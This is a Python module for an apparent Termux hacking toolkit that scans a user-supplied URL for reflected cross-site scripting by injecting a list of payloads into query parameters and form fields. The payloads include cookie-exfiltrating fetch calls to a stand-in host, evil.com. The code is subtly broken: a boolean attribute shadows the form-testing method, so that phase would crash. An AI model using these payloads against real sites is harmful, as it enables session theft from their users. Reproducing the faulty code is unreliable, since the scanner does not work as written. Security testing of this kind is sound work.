# ============================================
# TermuxX v3.0 - XSS Scanner
# Reflected XSS Detection
# Author: You
# ============================================

import re
import urllib.parse
import html
from core.colors import Colors
from core.web_engine import WebEngine


XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '"-alert(1)-"',
    "'-alert(1)-'",
    '<img """><script>alert(1)</script>">',
    '<div style="background:url(javascript:alert(1))">',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<script>fetch("http://evil.com/"+document.cookie)</script>',
    '<img src=1 onerror=fetch("http://evil.com/"+document.cookie)>',
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(alert(1))//*/</stYle/</titLe/</teXtarEa/</scRipt/--!>',
]

XSS_CONTEXTS = {
    'html_body': {
        'pattern': r'<[^>]*>(.*?)<[^>]*>',
        'desc': 'Payload reflected inside HTML body'
    },
    'html_attr': {
        'pattern': r'["\'][^"\']*["\']',
        'desc': 'Payload reflected inside HTML attribute'
    },
    'script_tag': {
        'pattern': r'<script[^>]*>.*?</script>',
        'desc': 'Payload reflected inside script tag'
    },
}


class XSSScanner:
    """
    Cross-Site Scripting (XSS) Scanner
    Reflected XSS detection with context analysis
    """

    def __init__(self):
        self.web = WebEngine()
        self.target_url = None
        self.vulnerabilities = []
        self.test_forms = True

    def configure(self):
        """Settings"""
        print(Colors.info("=== XSS SCANNER ===\n"))

        url = input(
            Colors.input_prompt("Target URL: ")
        ).strip()
        if not url:
            print(Colors.error("URL zaroori hai!"))
            return False
        self.target_url = self.web.normalize_url(url)

        forms = input(
            Colors.input_prompt(
                "Test HTML forms? [Y/n]: "
            )
        ).strip().lower()
        self.test_forms = forms != 'n'

        return True

    def check_reflection(self, response_text, payload):
        """Check if payload is reflected in response"""
        if payload in response_text:
            return {
                'reflected': True,
                'encoded': False,
                'context': 'raw'
            }

        decoded = html.unescape(response_text)
        if payload in decoded:
            return {
                'reflected': True,
                'encoded': True,
                'context': 'html_encoded'
            }

        # Check partial reflection
        key_parts = ['<script>', 'alert(', 'onerror=',
                      'onload=', 'javascript:']
        for part in key_parts:
            if part in response_text and part in payload:
                return {
                    'reflected': True,
                    'encoded': False,
                    'context': 'partial'
                }

        return {'reflected': False}

    def test_url_params(self):
        """URL parameters test karta hai"""
        print(Colors.info(
            "\n[Phase 1] Testing URL parameters..."
        ))

        baseline = self.web.get(self.target_url)
        if not baseline:
            print(Colors.error("Cannot reach target"))
            return

        for i, payload in enumerate(XSS_PAYLOADS):
            sep = "&" if "?" in self.target_url else "?"
            test_url = (
                f"{self.target_url}{sep}q="
                f"{urllib.parse.quote(payload)}"
            )

            resp = self.web.get(test_url)
            if not resp:
                continue

            result = self.check_reflection(
                resp.text, payload
            )

            if result['reflected']:
                severity = "HIGH"
                if result.get('encoded'):
                    severity = "MEDIUM"
                if result.get('context') == 'partial':
                    severity = "MEDIUM"

                vuln = {
                    'type': 'Reflected XSS',
                    'severity': severity,
                    'url': test_url,
                    'payload': payload,
                    'param': 'q',
                    'context': result.get(
                        'context', 'unknown'
                    ),
                    'encoded': result.get(
                        'encoded', False
                    ),
                }
                self.vulnerabilities.append(vuln)

                sev_color = (
                    Colors.RED if severity == "HIGH"
                    else Colors.YELLOW
                )
                print(
                    f"  {sev_color}[{severity}]"
                    f"{Colors.RESET} "
                    f"XSS Found! Context: "
                    f"{result.get('context')} "
                    f"- Payload: {payload[:50]}"
                )

    def test_forms(self, url):
        """Forms test karta hai"""
        forms = self.web.extract_forms(url)
        if not forms:
            print(Colors.info("No forms found"))
            return

        print(Colors.info(
            f"\n[Phase 2] Testing {len(forms)} "
            f"form(s)..."
        ))

        for fi, form in enumerate(forms):
            print(Colors.info(
                f"\nForm #{fi+1}: "
                f"Method={form['method']}"
            ))

            for inp in form['inputs']:
                if inp['type'] in [
                    'text', 'search', 'email',
                    'textarea', 'url', 'hidden'
                ]:
                    for payload in XSS_PAYLOADS[:10]:
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == inp['name']:
                                form_data[
                                    field['name']
                                ] = payload
                            else:
                                form_data[
                                    field['name']
                                ] = field.get(
                                    'value', 'test'
                                )

                        action = form['action']
                        if not action.startswith("http"):
                            action = (
                                url.rstrip('/') + '/' +
                                action.lstrip('/')
                            )

                        if form['method'] == "POST":
                            resp = self.web.post(
                                action, form_data
                            )
                        else:
                            resp = self.web.get(
                                action, form_data
                            )

                        if resp:
                            result = self.check_reflection(
                                resp.text, payload
                            )
                            if result['reflected']:
                                vuln = {
                                    'type': 'Reflected XSS (Form)',
                                    'severity': 'HIGH',
                                    'url': action,
                                    'payload': payload,
                                    'param': inp['name'],
                                    'method': form['method'],
                                    'context': result.get(
                                        'context'
                                    ),
                                }
                                self.vulnerabilities.append(
                                    vuln
                                )
                                print(
                                    f"  {Colors.RED}[HIGH]"
                                    f"{Colors.RESET} "
                                    f"XSS in form param: "
                                    f"{inp['name']} "
                                    f"- {payload[:40]}"
                                )
                                break

    def run(self):
        """Scanner start"""
        if not self.configure():
            return

        print(Colors.info(f"\nTarget: {self.target_url}"))
        print(Colors.info(
            f"Payloads: {len(XSS_PAYLOADS)}"
        ))
        print(Colors.info("=" * 60))

        self.test_url_params()

        if self.test_forms:
            self.test_forms_method(self.target_url)

        # Report
        print(Colors.info("\n" + "=" * 60))
        print(Colors.info("XSS SCAN REPORT"))
        print(Colors.info("=" * 60))

        if self.vulnerabilities:
            print(Colors.error(
                f"\n⚠️  {len(self.vulnerabilities)} "
                f"XSS VULNERABILITIES FOUND!\n"
            ))
            for v in self.vulnerabilities:
                sc = (
                    Colors.RED
                    if v['severity'] == 'HIGH'
                    else Colors.YELLOW
                )
                print(
                    f"  {sc}[{v['severity']}]"
                    f"{Colors.RESET} {v['type']}"
                )
                print(f"    Param: {v.get('param')}")
                print(
                    f"    Payload: "
                    f"{v.get('payload','')[:60]}"
                )
                print(
                    f"    Context: "
                    f"{v.get('context','N/A')}"
                )
                print()
        else:
            print(Colors.success(
                "\n✅ No XSS vulnerabilities detected."
            ))

    def test_forms_method(self, url):
        """Wrapper for form testing"""
        self.test_forms(url)


def run():
    scanner = XSSScanner()
    scanner.run()
